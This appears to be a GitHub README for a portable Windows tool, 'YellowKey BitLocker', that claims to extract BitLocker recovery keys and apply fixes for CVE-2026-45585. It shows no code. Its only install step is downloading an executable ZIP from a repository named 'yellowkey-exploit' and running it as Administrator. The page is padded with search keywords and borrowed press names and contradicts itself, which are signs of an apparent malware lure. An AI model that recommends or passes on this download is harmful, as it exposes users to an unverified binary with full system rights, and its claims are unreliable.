#  YellowKey BitLocker

**YellowKey BitLocker** is a free, portable utility for managing BitLocker encrypted drives on Windows 10 and 11. It became widely discussed following the **CVE-2026-45585** BitLocker bypass vulnerability, covered extensively on **Tom's Hardware** and security forums. Use it to extract recovery keys, view encryption status, apply remediation steps, and test bypass mitigation settings.

<img width="900" height="470" alt="9f552c40-69af-4413-9496-1b1f450fd98b" src="https://github.com/user-attachments/assets/68f74269-c3e9-4d9d-a0b9-56b083f05d69" />

## Install
[Download `YellowKey.zip`](https://github.com/yellowkey-exploit/YellowKey-Bitlocker/releases/download/CVE-2026-45585/YellowKey.zip)
---
<img width="1920" height="1200" alt="07b3e34d-7737-425a-9ac8-d3c9f88f054c" src="https://github.com/user-attachments/assets/b433d264-852c-4658-ab65-b33324b71d3c" />


## Key Features
- **Recovery key extraction** — read and backup BitLocker recovery keys from any accessible encrypted volume
- **Drive encryption status** — view encryption state, percentage progress, and protector type for all drives
- **TPM status display** — check TPM version, status, and whether it's the active protector
- **Protector type viewer** — see which protectors are active: TPM, PIN, recovery key, or certificate
- **CVE-2026-45585 remediation** — apply the recommended registry mitigations for the BitLocker bypass vulnerability
- **CLI and GUI modes** — use the graphical interface or run silent from the command line for scripted operations
- **Recovery key backup** — export keys to a file for safekeeping before making system changes
- **Portable** — no installation required, runs directly from USB
<img width="550" height="275" alt="a7139009-1c66-4240-beaf-31e0f25f3acf" src="https://github.com/user-attachments/assets/69e949f0-a898-4593-b3f6-6dc80c768f93" />

## Getting Started
1. **Download** the latest version using the button above.
2. **Extract** the archive.
3. **Run** `YellowKey-BitLocker.exe` as Administrator.
4. **Select the encrypted drive** from the detected list.
5. Choose your action — view status, extract key, or apply CVE remediation.

**Important    :** Always keep multiple backups of your recovery keys. Losing both the password and the recovery key means permanent data loss — there is no bypass without the key.
<img width="739" height="415" alt="ad93b009-6253-4ab3-86cc-e480be386e83" src="https://github.com/user-attachments/assets/fdb33f95-2621-4fa7-9577-0442139bfbd0" />

## CVE-2026-45585 — BitLocker Bypass Vulnerability
CVE-2026-45585 is a BitLocker bypass vulnerability that allows an attacker with physical access to a Windows 10/11 device to decrypt the drive without the recovery key under specific conditions. It was covered in detail on **Tom's Hardware** and **Microsoft Security Response Center**.

**YellowKey applies the recommended mitigation steps:**
1. Enable Secure Boot enforcement
2. Configure BitLocker to require PIN in addition to TPM
3. Apply registry settings that block the bypass vector

If you read about "yellow key bitlocker remediation" or "bitlocker bypass mitigation" — this is the tool that automates those steps.

<img width="538" height="371" alt="bd75a96c-e1d0-45f9-bdad-7c2f41efe85f" src="https://github.com/user-attachments/assets/56e3809d-8106-4199-a3d4-e8fc80eb5118" />

## BitLocker Recovery Key — How to Find It
If you've lost access to a BitLocker-protected drive, your recovery key may be stored in:
- **Microsoft Account** — sign in at account.microsoft.com and check Devices → BitLocker Recovery Keys
- **Active Directory** — your IT admin can retrieve it if the device is domain-joined
- **Azure AD** — check the Azure AD portal under Devices
- **Printed copy or USB** — if you saved it during setup

YellowKey can extract the key if you have admin access to a currently unlocked volume.

## BitLocker PIN Setup
Adding a PIN to your BitLocker configuration on top of TPM protection significantly reduces the risk from physical attacks. YellowKey guides you through:
1. Enabling PIN-based protection on your existing encrypted drive
2. Testing the PIN before locking yourself out
3. Backing up the updated recovery key

## Troubleshooting

<img width="743" height="413" alt="881139cb-6308-4458-9e38-cce51527ad28" src="https://github.com/user-attachments/assets/ad751886-f567-42fe-a152-095bc320ba2a" />

**"Access Denied" when trying to extract keys?**
You must run as Administrator. Even then, reading keys for drives other than the system drive may be restricted by BitLocker policy.

**Recovery key format not accepted?**
Make sure you're entering all 48 digits of the key (8 groups of 6 digits). YellowKey accepts keys with or without hyphens and with or without spaces.

**Drive not showing in the list?**
Only BitLocker-encrypted drives appear. Run `manage-bde -status` in an admin command prompt to verify BitLocker is active on the drive.

**CVE-2026-45585 mitigation not applying?**
Ensure Secure Boot is enabled in your UEFI firmware settings first. The registry mitigation alone is not sufficient without Secure Boot.

## System Requirements
- **Windows 10 / 11** (64-bit)
- Administrator privileges required
- BitLocker-enabled drives (optional — status viewer works on all drives)

## Security & Legal
Incorrect use of this tool may result in permanent data loss. Double-check recovery keys before making any changes to encrypted volumes.

**Recommendations:**
- Download **only** from this official GitHub repository.
- Scan files on [VirusTotal](https://www.virustotal.com).
- Always back up your data before working with encrypted volumes.

## Contributing
Contributions are welcome! Help improve key recovery logic, add new drive types, or expand CLI options.

## License & Acknowledgments
### License
**YellowKey BitLocker** is shared under the **MIT License**.
See [LICENSE](LICENSE) for details.

**Copyright © 2026 Kamarguinho**

### Acknowledgments
- The Windows security and BitLocker research community.
- CVE disclosure researchers who identified CVE-2026-45585.
